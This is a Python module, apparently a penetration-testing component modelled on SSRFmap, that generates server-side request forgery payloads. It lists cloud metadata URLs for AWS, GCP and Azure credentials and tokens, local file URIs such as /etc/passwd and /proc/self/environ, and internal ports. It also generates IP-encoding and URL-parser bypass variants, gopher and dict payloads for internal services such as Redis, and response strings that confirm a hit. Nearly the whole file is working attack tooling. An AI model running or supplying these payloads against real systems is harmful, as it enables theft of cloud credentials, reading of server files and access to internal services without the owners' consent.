"""SSRFmap-inspired SSRF payload üretici — bypass ve cloud metadata."""

import socket
import struct

# SSRFmap cloud metadata paths
CLOUD_METADATA_PATHS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.0.0.192/latest/",
]

INTERNAL_PORTS = [21, 22, 25, 80, 443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9000, 9200, 11211, 27017]

INTERNAL_FILES = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/version",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
]

# SSRFmap IP bypass teknikleri
def _ip_default_local(ips, ip):
    ips.update(["127.0.0.1", "0.0.0.0", "localhost"])

def _ip_default_shortcut(ips, ip):
    ips.update(["[::1]", "[::]", "0000::1", "0", "127.1", "127.0.1"])

def _ip_default_cidr(ips, ip):
    ips.update(["127.0.0.0", "127.0.1.3", "127.42.42.42", "127.127.127.127"])

def _ip_decimal_notation(ips, ip):
    try:
        packed = socket.inet_aton(ip)
        ips.add(str(struct.unpack("!I", packed)[0]))
    except OSError:
        pass

def _ip_dotted_decimal_overflow(ips, ip):
    try:
        ips.add(".".join(str(int(p) + 256) for p in ip.split(".")))
    except (ValueError, AttributeError):
        pass

def _ip_dotless_decimal(ips, ip):
    try:
        parts = ip.split(".")
        val = sum(int(parts[i]) * (256 ** (3 - i)) for i in range(4))
        ips.add(str(val))
    except (ValueError, IndexError):
        pass

def _ip_dotted_hex(ips, ip):
    try:
        ips.add(".".join(hex(int(p)) for p in ip.split(".")))
    except ValueError:
        pass

def _ip_dotted_octal(ips, ip):
    try:
        ips.add(".".join(oct(int(p)).replace("o", "") for p in ip.split(".")))
    except ValueError:
        pass

def _ip_dns_redirect(ips, ip):
    if ip == "127.0.0.1":
        ips.update(["localtest.me", "127.0.0.1.nip.io", "127.0.0.1.xip.io",
                    "customer1.app.localhost.my.company.127.0.0.1.nip.io"])
    if ip == "169.254.169.254":
        ips.update(["metadata.nicob.net", "169.254.169.254.xip.io", "1ynrnhl.xip.io"])

def gen_ip_variants(base_ip="127.0.0.1", level=5):
    """SSRFmap gen_ip_list mantığı."""
    ips = {base_ip}
    _ip_default_local(ips, base_ip)
    _ip_default_shortcut(ips, base_ip)
    _ip_dns_redirect(ips, base_ip)
    _ip_default_cidr(ips, base_ip)
    if level >= 4:
        _ip_decimal_notation(ips, base_ip)
    if level >= 5:
        _ip_dotted_decimal_overflow(ips, base_ip)
        _ip_dotless_decimal(ips, base_ip)
        _ip_dotted_hex(ips, base_ip)
        _ip_dotted_octal(ips, base_ip)
    return list(ips)

def _url_bypass_variants(url):
    """SSRFmap URL bypass teknikleri."""
    variants = [url]
    if "://" in url:
        scheme, rest = url.split("://", 1)
        variants.append(f"{scheme}://127.0.0.1@example.com@{rest.split('/', 1)[-1] if '/' in rest else ''}")
        variants.append(f"{scheme}://example.com@{rest}")
        variants.append(f"{scheme}://127.0.0.1%23@example.com")
        variants.append(f"{scheme}://127.0.0.1%2523@example.com")
        variants.append(url.replace("127.0.0.1", "127.0.0.1.xip.io"))
        variants.append(url.replace("localhost", "localtest.me"))
        variants.append(url.replace("http://", "Http://"))
        variants.append(url.replace("http://", "hTtp://"))
        variants.append(url.replace("http://", "http:/%2f%2f"))
        variants.append(url.replace("http://", "http:\\\\"))
    return list(dict.fromkeys(variants))

def gen_ssrf_payloads():
    """Tüm SSRF payload'larını üret."""
    seen = set()
    base_ips = gen_ip_variants("127.0.0.1") + gen_ip_variants("169.254.169.254")

    for ip in base_ips:
        for port in [None] + INTERNAL_PORTS[:12]:
            if port:
                base = f"http://{ip}:{port}/"
            else:
                base = f"http://{ip}/"
            for v in _url_bypass_variants(base):
                if v not in seen:
                    seen.add(v)
                    yield v

    for path in CLOUD_METADATA_PATHS:
        for v in _url_bypass_variants(path):
            if v not in seen:
                seen.add(v)
                yield v

    for f in INTERNAL_FILES:
        if f not in seen:
            seen.add(f)
            yield f

    # SSRFmap protocol wrappers
    protocols = [
        "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a",
        "dict://127.0.0.1:6379/info",
        "ldap://127.0.0.1/",
        "ftp://127.0.0.1/",
        "tftp://127.0.0.1/",
        "http://0x7f000001/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://127.1/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    ]
    for p in protocols:
        if p not in seen:
            seen.add(p)
            yield p

# SSRF yanıt göstergeleri
SSRF_INDICATORS = [
    "root:x:0:0:",
    "ami-id",
    "instance-id",
    "iam/security-credentials",
    "computeMetadata",
    "access_token",
    "[extensions]",
    "for 16-bit app support",
    "SSH-2.0",
    "redis_version",
    "MongoDB",
    "mysql_native_password",
    "220 ",
    "HTTP/1.",
    "localhost",
    "127.0.0.1",
    "meta-data",
    "private-ip",
    "public-keys",
]

SSRF_PARAM_HINTS = [
    'url', 'uri', 'link', 'src', 'source', 'dest', 'destination', 'redirect',
    'next', 'return', 'returnurl', 'return_url', 'callback', 'continue',
    'target', 'path', 'file', 'document', 'folder', 'root', 'page', 'feed',
    'host', 'site', 'html', 'val', 'validate', 'domain', 'window', 'data',
    'reference', 'ref', 'view', 'image', 'img', 'load', 'fetch', 'proxy',
    'api', 'endpoint', 'webhook', 'hook', 'request', 'share', 'navigate',
]
